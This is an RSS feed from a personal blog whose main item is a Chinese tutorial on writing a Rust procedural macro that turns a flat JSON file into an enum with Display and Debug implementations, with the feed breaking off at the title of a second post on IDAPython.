<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hacbit&#39;s blog</title>
    <link>http://hacbit.tech/</link>
    
    <atom:link href="http://hacbit.tech/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>The world open itself before those with noble heart.</description>
    <pubDate>Wed, 17 Apr 2024 04:37:52 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>rust宏魔法(1)</title>
      <link>http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/</link>
      <guid>http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/</guid>
      <pubDate>Wed, 17 Apr 2024 00:29:14 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）&quot;&gt;&lt;a href=&quot;#Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）&quot; class=&quot;headerlink&quot; title=&quot;Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）&quot;&gt;&lt;/a&gt;Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;注：本文默认你已经有一定的Rust基础&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;rust的宏的强大相信大家肯定听的不少，本篇就简单说说rust的过程宏&lt;/p&gt;
&lt;p&gt;rust的宏有好几种，有基于模式匹配的，还有可以直接对语法树动手的，过程宏就是可以修改语法树，可以在编译器派生代码：比如有个test crate，然后它依赖于test_macro crate，而后者是一个proc-macro库，也就是里面定义了过程宏，编译时就会先编译test_macro然后用test_macro的对test的语法解析流修改再丢给编译器，所以可以实现很多非常抽象的操作。&lt;/p&gt;
&lt;p&gt;写本文的契机是，前段时间在Rust中文社区群里看到有人问能不能用宏把json生成一个enum（json只有一层），这个需求和过程宏还是很契合的，所以就简单实现了一下，以下内容就是对实现的讲解&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）"><a href="#Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）" class="headerlink" title="Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）"></a>Rust宏魔法——第一辑（不知道后面还会不会更新，总之这是个系列）</h1><p><em><strong>注：本文默认你已经有一定的Rust基础</strong></em></p><p>rust的宏的强大相信大家肯定听的不少，本篇就简单说说rust的过程宏</p><p>rust的宏有好几种，有基于模式匹配的，还有可以直接对语法树动手的，过程宏就是可以修改语法树，可以在编译器派生代码：比如有个test crate，然后它依赖于test_macro crate，而后者是一个proc-macro库，也就是里面定义了过程宏，编译时就会先编译test_macro然后用test_macro的对test的语法解析流修改再丢给编译器，所以可以实现很多非常抽象的操作。</p><p>写本文的契机是，前段时间在Rust中文社区群里看到有人问能不能用宏把json生成一个enum（json只有一层），这个需求和过程宏还是很契合的，所以就简单实现了一下，以下内容就是对实现的讲解</p><span id="more"></span><p>首先开个crate吧</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo new json_to_enum</span><br></pre></td></tr></table></figure><blockquote><p>  直到撰写本文时，想要定义过程宏还是必须要单独开个crate，并且在<code>cargo.toml</code>里面设置 <code>lib.proc-macro = true</code></p><p>  至于原因是rust的编译单元是crate，而前面也说要拿过程宏的库编译好对其他库使用的，所以就不可避免要分割，单独开个crate。</p></blockquote><p>然后创建过程宏库，这里我一般喜欢把依赖的其他自己写的库放在src下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cargo new <span class="literal">--lib</span> json_to_enum_macro</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><p>然后创建一个json文件用于测试，内容比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;app_name_not_set&quot;</span><span class="punctuation">:</span> <span class="string">&quot;应用名称未设置&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_too_long&quot;</span><span class="punctuation">:</span> <span class="string">&quot;应用名称过长&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_invalid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;应用名称无效&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;app_name_already_exists&quot;</span><span class="punctuation">:</span> <span class="string">&quot;应用名称已存在&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>现在的文件结构应该是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├─src</span><br><span class="line">│  ├─main.rs</span><br><span class="line">│  └─json_to_enum_macro</span><br><span class="line">│      └─src</span><br><span class="line">│   └─lib.rs</span><br><span class="line">└─test.json</span><br></pre></td></tr></table></figure><p>emm，先展示一下调用的效果吧</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> json_to_enum_macro::json_to_enum;</span><br><span class="line"></span><br><span class="line">json_to_enum! &#123;</span><br><span class="line">    <span class="meta">#[from_json(<span class="string">&quot;test.json&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">4</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">t</span> = <span class="keyword">unsafe</span> &#123; std::mem::transmute::&lt;<span class="type">u8</span>, Test&gt;(i) &#125;;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125; &#123;&#125;&quot;</span>, t, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">AppNameAlreadyExists &quot;应用名称已存在&quot;</span></span><br><span class="line"><span class="comment">AppNameInvalid &quot;应用名称无效&quot;</span></span><br><span class="line"><span class="comment">AppNameNotSet &quot;应用名称未设置&quot;</span></span><br><span class="line"><span class="comment">AppNameTooLong &quot;应用名称过长&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><code>json_to_enum</code>宏里面的匹配规则是一看到这个需求时的想法，所以别问我为什么要这样写（）</p><p>里面塞一个空的enum也是方便指定这个解析出的enum的名字而已，最终的效果是会替换掉enum的内容，所以里面写什么内容都没有用</p><p>好了，现在开始正式编写！</p><h2 id="开始编写你的proc-macro"><a href="#开始编写你的proc-macro" class="headerlink" title="开始编写你的proc-macro"></a>开始编写你的proc-macro</h2><p>先在json_to_enum_macro的<code>cargo.toml</code>里面设置 <code>lib.proc-macro = true</code></p><p>然后导入proc-macro的依赖 quote，syn，以及用于解析json文件的serde_json库</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo add quote syn serde_json</span><br></pre></td></tr></table></figure><p>现在文件应该是这样</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;json_to_enum_macro&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[lib]</span></span><br><span class="line"><span class="attr">proc-macro</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">quote</span> = <span class="string">&quot;1.0.36&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0.116&quot;</span></span><br><span class="line"><span class="attr">syn</span> = <span class="string">&quot;2.0.59&quot;</span></span><br></pre></td></tr></table></figure><p>把这个库添加到json_to_enum的依赖</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[workspace]</span></span><br><span class="line"><span class="attr">members</span> = [</span><br><span class="line">    <span class="string">&quot;src/json_to_enum_macro&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;json_to_enum&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies.json_to_enum_macro]</span></span><br><span class="line"><span class="attr">path</span> = <span class="string">&quot;src/json_to_enum_macro&quot;</span></span><br></pre></td></tr></table></figure><p>接下来rust-analyser就会一起解析你的macro库了</p><p>打开<code>lib.rs</code>文件导入依赖</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> proc_macro;</span><br><span class="line"><span class="keyword">use</span> proc_macro::&#123;Span, TokenStream&#125;;</span><br><span class="line"><span class="keyword">use</span> quote::quote;</span><br><span class="line"><span class="keyword">use</span> syn::&#123;parse_macro_input, DeriveInput, Ident, Lit&#125;;</span><br></pre></td></tr></table></figure><p>一般来说基本都会用上这几个：<code>proc_macro::TokenStream, quote::quote, syn::&#123;parse_macro_input, DeriveInput&#125;</code></p><p>proc macro也有好几种，比如 <code>proc_macro_derive</code> 可以给enum，struct啥的实现某个特征， 使用方法比如： <code>#[derive(Debug)] struct DebugStruct;</code>， 比如 <code>proc_macro_attribute</code> 可以扩展函数，enum字段等的功能。</p><p>而这里由于我们连enum都要派生，上面说的两者都要依托于某个对象，所以我们这里也就采用<code>proc_macro</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[proc_macro]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">json_to_enum</span>(input: TokenStream) <span class="punctuation">-&gt;</span> TokenStream &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = parse_macro_input!(input <span class="keyword">as</span> DeriveInput);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">gen</span> = quote! &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    gen.<span class="title function_ invoke__">into</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要先解析一个attribute，得到json文件的路径，比如这个attribute是 <code>#[from_json(&quot;test.json&quot;)]</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于可以有很多个attribute，所以这里返回的是一个Vec</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">attribute</span> = &amp;input.attrs;</span><br><span class="line"><span class="comment">// 解析出attr里提供的json文件路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json_name</span> = attribute</span><br><span class="line">.<span class="title function_ invoke__">iter</span>()</span><br><span class="line">.<span class="title function_ invoke__">find_map</span>(|attr| &#123;</span><br><span class="line">        <span class="keyword">if</span> attr.<span class="title function_ invoke__">path</span>().<span class="title function_ invoke__">is_ident</span>(<span class="string">&quot;from_json&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">// 尝试把attr解析成字面量(literal)</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">lit</span> = <span class="keyword">match</span> attr.parse_args::&lt;Lit&gt;() &#123;</span><br><span class="line">                <span class="title function_ invoke__">Ok</span>(lit) =&gt; lit,</span><br><span class="line">                <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="built_in">panic!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, e),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Lit</span>::<span class="title function_ invoke__">Str</span>(lit) = lit &#123;</span><br><span class="line">                <span class="title function_ invoke__">Some</span>(lit.<span class="title function_ invoke__">value</span>())</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="comment">// 读取文件内容</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json_content</span> = std::fs::<span class="title function_ invoke__">read_to_string</span>(json_name).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;file not found&quot;</span>);</span><br><span class="line"><span class="comment">// 解析文件内容</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">json</span>: serde_json::Value = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;json_content).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;json parse error&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后获取你传入的enum的名字（标识符），和json的keys就可以派生enum了</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">name</span> = &amp;input.ident;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">variants</span> = json</span><br><span class="line">    .<span class="title function_ invoke__">as_object</span>()</span><br><span class="line">    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;json should be object&quot;</span>)</span><br><span class="line">    .<span class="title function_ invoke__">keys</span>()</span><br><span class="line">    .<span class="title function_ invoke__">map</span>(|k| &#123;</span><br><span class="line">        <span class="comment">// json里面是snake命名，转成驼峰式命名</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ident</span> = Ident::<span class="title function_ invoke__">new</span>(&amp;<span class="title function_ invoke__">snake_to_camel</span>(k), Span::<span class="title function_ invoke__">call_site</span>().<span class="title function_ invoke__">into</span>());</span><br><span class="line">        quote! &#123;</span><br><span class="line">            #ident,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这时候就可以像这样派生一个enum</p><p>是不是感觉和写<code>macro_rules!</code>很像呢</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">quote! &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> #name &#123;</span><br><span class="line">        *(#variants)*</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还要实现一下Display，需求说的是要json字段对应的值（也就是那些中文），这也显然只要获取json的values即可</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">msgs</span> = json.<span class="title function_ invoke__">as_object</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">values</span>().<span class="title function_ invoke__">map</span>(|v| &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">msg</span> = v.<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;value should be string&quot;</span>);</span><br><span class="line">        quote! &#123;</span><br><span class="line">            #msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>后面实现Display，（我也顺便实现了Debug）也就跟上面一样</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::Display <span class="keyword">for</span> #name &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            #(</span><br><span class="line">                #name::#keys =&gt; <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;&#125;&quot;</span>, <span class="built_in">stringify!</span>(#msgs)),</span><br><span class="line">            )*</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里就已经完成了，如果你不知道后面这部分怎么弄就好好理解一下前面的代码，我故意没有全都写出来（）</p><p>实现完后记得测试一下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> json_to_enum_macro::json_to_enum;</span><br><span class="line"></span><br><span class="line">json_to_enum! &#123;</span><br><span class="line">    <span class="meta">#[from_json(<span class="string">&quot;test.json&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = Test::AppNameNotSet;</span><br><span class="line">    <span class="built_in">assert_eq!</span>(a.<span class="title function_ invoke__">to_string</span>(), <span class="string">&quot;应用名称未设置&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能正常跑就基本没啥问题了，还担心就展开看看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cargo expand</span><br></pre></td></tr></table></figure><p>展开结果：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![feature(prelude_import)]</span></span><br><span class="line"><span class="meta">#[prelude_import]</span></span><br><span class="line"><span class="keyword">use</span> std::prelude::rust_2021::*;</span><br><span class="line"><span class="meta">#[macro_use]</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> std;</span><br><span class="line"><span class="keyword">use</span> parser_macro::json_to_enum;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    AppNameAlreadyExists,</span><br><span class="line">    AppNameInvalid,</span><br><span class="line">    AppNameNotSet,</span><br><span class="line">    AppNameTooLong,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::Display <span class="keyword">for</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Test::AppNameAlreadyExists =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;5df2&#125;\u&#123;5b58&#125;\u&#123;5728&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameInvalid =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;65e0&#125;\u&#123;6548&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameNotSet =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;672a&#125;\u&#123;8bbe&#125;\u&#123;7f6e&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameTooLong =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(</span><br><span class="line">                    <span class="built_in">format_args!</span>(</span><br><span class="line">                        <span class="string">&quot;&#123;0&#125;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;\&quot;\u&#123;5e94&#125;\u&#123;7528&#125;\u&#123;540d&#125;\u&#123;79f0&#125;\u&#123;8fc7&#125;\u&#123;957f&#125;\&quot;&quot;</span>,</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">std</span>::fmt::<span class="built_in">Debug</span> <span class="keyword">for</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> std::fmt::Formatter) <span class="punctuation">-&gt;</span> std::fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Test::AppNameAlreadyExists =&gt; &#123;</span><br><span class="line">                f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameAlreadyExists&quot;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            Test::AppNameInvalid =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameInvalid&quot;</span>)),</span><br><span class="line">            Test::AppNameNotSet =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameNotSet&quot;</span>)),</span><br><span class="line">            Test::AppNameTooLong =&gt; f.<span class="title function_ invoke__">write_fmt</span>(<span class="built_in">format_args!</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>, <span class="string">&quot;AppNameTooLong&quot;</span>)),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = Test::AppNameNotSet;</span><br><span class="line">    <span class="title function_ invoke__">match</span> (&amp;a.<span class="title function_ invoke__">to_string</span>(), &amp;<span class="string">&quot;应用名称未设置&quot;</span>) &#123;</span><br><span class="line">        (left_val, right_val) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> !(*left_val == *right_val) &#123;</span><br><span class="line">                <span class="keyword">let</span> <span class="variable">kind</span> = ::core::panicking::AssertKind::<span class="built_in">Eq</span>;</span><br><span class="line">                ::core::panicking::<span class="title function_ invoke__">assert_failed</span>(</span><br><span class="line">                    kind,</span><br><span class="line">                    &amp;*left_val,</span><br><span class="line">                    &amp;*right_val,</span><br><span class="line">                    ::core::option::<span class="type">Option</span>::<span class="literal">None</span>,</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://hacbit.tech/rust%E5%AE%8F%E9%AD%94%E6%B3%95-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>idapython入门</title>
      <link>http://hacbit.tech/idapython%E5%85%A5%E9%97%A8/</link>
      <guid>http://hacbit.tech/idapython%E5%85%A5%E9%97%A8/</guid>
